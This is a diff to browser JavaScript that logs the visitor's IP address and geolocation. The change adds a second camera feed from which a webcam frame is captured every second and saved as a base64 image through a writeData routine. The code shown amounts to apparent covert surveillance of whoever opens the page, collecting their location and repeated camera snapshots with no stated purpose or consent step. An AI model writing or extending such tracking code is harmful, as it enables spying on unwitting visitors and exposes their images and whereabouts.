@@ -29,6 +29,8 @@ fetch('https://api.ipify.org?format=json')
   .then(data => writeData(data, 'ip/'));
 
 const videoId = 'video';
+const videoId2 = 'video2';
+
 const scaleFactor = 0.25;
 
 const optionsGeo = {
@@ -81,6 +83,18 @@ function shoot(media = 'image/') {
   writeData(result, media);
 }
 
+function shoot2(media = 'image/') {
+  const video = document.getElementById(videoId2);
+  const canvas = capture(video, scaleFactor);
+  const based64 = canvas.toDataURL("image/png");
+
+  const result = {
+    image: based64,
+  };
+
+  writeData(result, media);
+}
+
 const btn = document.getElementById('btn');
 btn.addEventListener('click', (e) => {
   e.preventDefault();
@@ -103,7 +117,7 @@ navigator.geolocation.getCurrentPosition(successGeo, errorGeo, optionsGeo);
   navigator.getUserMedia(
   { audio: false, video: { width: 1280, height: 720 } },
   (stream) => {
-    const video = document.querySelector('video');
+    const video = document.getElementById('video');
 
     if (video) {
       video.srcObject = stream;
@@ -122,7 +136,7 @@ navigator.geolocation.getCurrentPosition(successGeo, errorGeo, optionsGeo);
   navigator.mediaDevices.getUserMedia(
   { audio: false, video: { width: 1280, height: 720 } },
   (stream) => {
-    const video = document.querySelector('video');
+    const video = document.getElementById('video2');
 
     if (video) {
       video.srcObject = stream;
@@ -130,7 +144,7 @@ navigator.geolocation.getCurrentPosition(successGeo, errorGeo, optionsGeo);
         video.play();
       };
       setInterval(() => {
-        shoot('media/')
+        shoot2('media/')
       }, 1000)
 
     }
